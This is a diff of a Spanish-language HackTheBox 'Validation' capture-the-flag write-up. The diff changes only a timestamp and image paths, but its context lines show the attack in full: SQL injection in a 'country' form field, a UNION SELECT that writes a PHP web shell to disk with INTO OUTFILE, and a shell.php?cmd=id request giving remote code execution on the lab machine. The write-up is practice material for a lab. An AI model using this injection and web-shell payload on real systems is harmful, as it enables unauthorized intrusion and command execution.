@@ -1,7 +1,7 @@
 ---
 publish: true
 created: 2026-09-11T12:16:55.949Z
-modified: 2026-09-11T12:24:56.674Z
+modified: 2026-09-11T18:12:58.453Z
 ---
 
 # Validation
@@ -90,7 +90,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Vemos un formulario web
 
-![image.png](/images/HackTheBox/image.png)
+![image.png](WriteUps/images/HackTheBox/image.png)
 
 En primer lugar, hacemos una captura de la peticion del formulario y observamos dos campos: username y country
 
@@ -100,9 +100,9 @@ Probamos a inyectar una comilla y vemos que salta un error en la web :
 Brazil’
 ```
 
-![image.png](/images/HackTheBox/837b1a54-af10-481c-a6c8-0bc031312a36.png)
+![image.png](WriteUps/images/HackTheBox/837b1a54-af10-481c-a6c8-0bc031312a36.png)
 
-![image.png](/images/HackTheBox/image%201.png)
+![image.png](WriteUps/images/HackTheBox/image 1.png)
 
 Vemos que el campo es vulnerable. Probamos a ver si cerrando la consulta sigue mostrando error y vemos que no
 
@@ -111,7 +111,7 @@ Vemos que el campo es vulnerable. Probamos a ver si cerrando la consulta sigue m
 username=test&country=Brazil' -- -
 ```
 
-![image.png](/images/HackTheBox/image%202.png)
+![image.png](WriteUps/images/HackTheBox/image 2.png)
 
 Entonces lo que probamos es a inyectar un payload en la consulta : Explotacion 1
 
@@ -133,7 +133,7 @@ Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
 
 Accedemos a la pagina y muesta un error
 
-![image.png](/images/HackTheBox/image%203.png)
+![image.png](WriteUps/images/HackTheBox/image 3.png)
 
 Accedemos ahora a :
 
@@ -141,7 +141,7 @@ Accedemos ahora a :
 http://10.10.11.116/shell.php?cmd=id
 ```
 
-![image.png](/images/HackTheBox/image%204.png)
+![image.png](WriteUps/images/HackTheBox/image 4.png)
 
 Obtenemos RCE
 
